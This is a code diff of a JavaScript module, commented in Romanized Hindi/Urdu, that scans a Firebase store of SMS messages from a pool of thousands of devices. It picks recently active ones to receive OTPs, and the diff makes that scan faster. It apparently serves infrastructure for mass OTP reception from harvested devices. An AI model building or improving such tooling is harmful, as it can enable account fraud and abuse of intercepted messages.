@@ -98,10 +98,14 @@ function urlFor(path, params = {}) {
   return `${baseUrl()}/${p ? `${p}.json` : '.json'}${q ? `?${q}` : ''}`;
 }
 
-async function fbGet(path, params = {}) {
-  // Timeout 30s — clients.json 1.2MB+ ka ho sakta hai; cold fetch ~11-15s
-  // leta hai (12s par pehle TimeoutError aakar pool ko 0 bana deta tha).
-  const res = await fetch(urlFor(path, params), { signal: AbortSignal.timeout(30_000) });
+async function fbGet(path, params = {}, timeoutMs = 30_000) {
+  // Default timeout 30s — clients.json 1.2MB+ ka ho sakta hai; cold fetch
+  // ~11-15s leta hai (12s par pehle TimeoutError aakar pool ko 0 bana deta
+  // tha). Halki per-device probes apna chhota timeout de sakti hain taaki ek
+  // atki hui request poore scan chunk ko 30s tak hostage na rakhe.
+  const res = await fetch(urlFor(path, params), {
+    signal: AbortSignal.timeout(Math.max(1_000, Number(timeoutMs) || 30_000)),
+  });
   if (!res.ok) {
     const txt = await res.text().catch(() => '');
     const hint = (res.status === 401 || res.status === 400)
@@ -484,13 +488,7 @@ function looksLikeMessageNode(node) {
 // OTP bhejne se pehle isi se decide hoga ke device abhi active hai ya nahi —
 // mare hue device par OTP bhejkar 100s wait + rate-limit burn, dono bachega.
 // ---------------------------------------------------------------------------
-export async function fetchDeviceLastActivityMs(deviceId) {
-  if (!deviceId) return null;
-  const messagesPath = cleanPath(_source?.messagesPath || env('FIREBASE_MESSAGES_PATH', 'messages'));
-  let node = null;
-  try {
-    node = await fbGet(`${messagesPath}/${seg(deviceId)}`, { orderBy: '"$key"', limitToLast: 50 });
-  } catch { return null; }
+function bestActivityFromMessagesNode(node) {
   if (!node || typeof node !== 'object') return null;
   const entries = Array.isArray(node) ? node.map((m, i) => [i, m]) : Object.entries(node);
   let best = null;
@@ -501,6 +499,43 @@ export async function fetchDeviceLastActivityMs(deviceId) {
     if (ts && (!best || ts > best)) best = ts;
   }
   return best;
+}
+
+function messagesNodeEntryCount(node) {
+  if (!node || typeof node !== 'object') return 0;
+  return Array.isArray(node) ? node.length : Object.keys(node).length;
+}
+
+export async function fetchDeviceLastActivityMs(deviceId) {
+  if (!deviceId) return null;
+  const messagesPath = cleanPath(_source?.messagesPath || env('FIREBASE_MESSAGES_PATH', 'messages'));
+  let node = null;
+  try {
+    // Last-seen ke liye taazaa activity hi chahiye. Pehle har device ke 50
+    // full SMS download hote the — ~2000 devices par yahi full scan ko
+    // minutes me badal deta tha. Ab pehle sirf last 5 entries; unme koi
+    // parseable timestamp na mile tabhi purani 50-entry fallback query.
+    node = await fbGet(
+      `${messagesPath}/${seg(deviceId)}`,
+      { orderBy: '"$key"', limitToLast: 5 },
+      8_000
+    );
+  } catch { return null; }
+
+  const quickBest = bestActivityFromMessagesNode(node);
+  if (quickBest) return quickBest;
+  if (!messagesNodeEntryCount(node)) return null;
+
+  try {
+    const widerNode = await fbGet(
+      `${messagesPath}/${seg(deviceId)}`,
+      { orderBy: '"$key"', limitToLast: 50 },
+      8_000
+    );
+    return bestActivityFromMessagesNode(widerNode);
+  } catch {
+    return null;
+  }
 }
 
 // Parallel last-activity probe — 3000-device pool me ek-ek karke probe karna
@@ -549,6 +584,8 @@ export async function scanFreshDevices(entries = [], opts = {}) {
   const maxProbe = Math.max(chunkSize, Number(opts.maxProbe ?? 800));
   const concurrency = Math.max(1, Number(opts.concurrency ?? 24));
   const widenByDoubling = Boolean(opts.widenByDoubling);
+  const backupCount = Math.max(want, Number(opts.backupCount) || want);
+  const earlyWidenStepMs = Math.max(0, Number(opts.earlyWidenStepMs) || 0);
   const probe = typeof opts.probe === 'function' ? opts.probe : null;
   const onProgress = typeof opts.onProgress === 'function' ? opts.onProgress : null;
   const shouldAbort = typeof opts.shouldAbort === 'function' ? opts.shouldAbort : null;
@@ -567,7 +604,28 @@ export async function scanFreshDevices(entries = [], opts = {}) {
   const probed = [];          // { entry, lastActivityMs } — har probed device ke numbers
   const probedDeviceIds = [];
   const fresh = [];
+  const scanStartedAt = Date.now();
+  let bestLastActivityMs = null;
   let checked = 0;
+
+  const rankedDoublingCandidates = (maxAgeMs = Number.POSITIVE_INFINITY) => {
+    const rankedAt = Date.now();
+    return probed
+      .filter((p) => p.lastActivityMs && (rankedAt - p.lastActivityMs) <= maxAgeMs)
+      .sort((a, b) => (b.lastActivityMs || 0) - (a.lastActivityMs || 0))
+      .slice(0, backupCount)
+      .map((p) => ({
+        ...p,
+        windowMs: doubledWidenWindowMs(windowMs, rankedAt - (p.lastActivityMs || rankedAt)),
+      }));
+  };
+
+  const earlyAllowedWindowMs = () => {
+    if (!widenByDoubling || !earlyWidenStepMs) return windowMs;
+    const elapsedMs = Date.now() - scanStartedAt;
+    const steps = Math.min(40, Math.floor(elapsedMs / earlyWidenStepMs));
+    return windowMs * (2 ** steps);
+  };
 
   for (let off = 0; off < deviceIds.length && checked < maxProbe && fresh.length < want && !aborted(); off += chunkSize) {
     const chunk = deviceIds.slice(off, off + Math.min(chunkSize, maxProbe - checked));
@@ -577,17 +635,73 @@ export async function scanFreshDevices(entries = [], opts = {}) {
     const now = Date.now();
     for (const devId of chunk) {
       const ts = res.get(devId) ?? null;
+      if (ts && (!bestLastActivityMs || ts > bestLastActivityMs)) bestLastActivityMs = ts;
       for (const entry of byDevice.get(devId) || []) {
         probed.push({ entry, lastActivityMs: ts });
         if (ts && (now - ts) <= windowMs) fresh.push({ entry, lastActivityMs: ts });
       }
     }
+
+    const allowedWindowMs = earlyAllowedWindowMs();
     if (onProgress) {
-      try { onProgress({ checked, freshCount: fresh.length, totalDevices: deviceIds.length }); } catch {}
+      try {
+        onProgress({
+          checked,
+          freshCount: fresh.length,
+          totalDevices: deviceIds.length,
+          allowedWindowMs,
+          bestLastActivityMs,
+        });
+      } catch {}
+    }
+
+    // Full pool khatam honay ka intezaar hi scan ko minutes me badal deta
+    // tha. Har earlyWidenStepMs par agli ladder window khul jati hai:
+    // mis. step 10s ho to scan ke 10s baad ≤20s, 20s baad ≤40s, 30s baad
+    // ≤80s wala probed-so-far device milte hi ranked backups ke saath
+    // return. Koi aisa device abhi tak na mila ho to scan aage badhta hai.
+    if (
+      widenByDoubling && earlyWidenStepMs &&
+      !aborted() && checked < deviceIds.length &&
+      Date.now() - scanStartedAt >= earlyWidenStepMs
+    ) {
+      const early = rankedDoublingCandidates(Math.min(maxWidenMs, allowedWindowMs));
+      if (early.length) {
+        return {
+          fresh: early, checked, probedDeviceIds,
+          widestWindowMs: Math.max(...early.map((p) => p.windowMs || windowMs)),
+          widened: (early[0].windowMs || windowMs) > windowMs,
+          earlyWidened: true,
+          exhausted: false, totalDevices: deviceIds.length,
+        };
+      }
     }
   }
 
   const exhausted = checked >= deviceIds.length;
+
+  if (widenByDoubling && !aborted()) {
+    // Scanner ne jitne devices parkhe hain, unhi ke sabse taaza ranked
+    // backups ek saath de do. Ek device stale/fail ho jaye to engine agla
+    // cached device use karega — poora Firebase pass dobara nahi ghumega.
+    // Lekin agar base-window wala device pehle chunk me mil gaya ho to
+    // uske saath dinon purane backups mat chipkao; sirf current ladder ke
+    // andar wale rakho. Base miss par hi unlimited fallback rakho.
+    const rankedLimitMs = fresh.length
+      ? Math.min(maxWidenMs, Math.max(windowMs, earlyAllowedWindowMs()))
+      : maxWidenMs;
+    const ranked = rankedDoublingCandidates(rankedLimitMs);
+    if (ranked.length) {
+      return {
+        fresh: ranked, checked, probedDeviceIds,
+        widestWindowMs: Math.max(...ranked.map((p) => p.windowMs || windowMs)),
+        widened: (ranked[0].windowMs || windowMs) > windowMs,
+        earlyWidened: false,
+        exhausted, totalDevices: deviceIds.length,
+      };
+    }
+  }
+
   if (fresh.length) {
     fresh.sort((a, b) => (b.lastActivityMs || 0) - (a.lastActivityMs || 0));
     return {
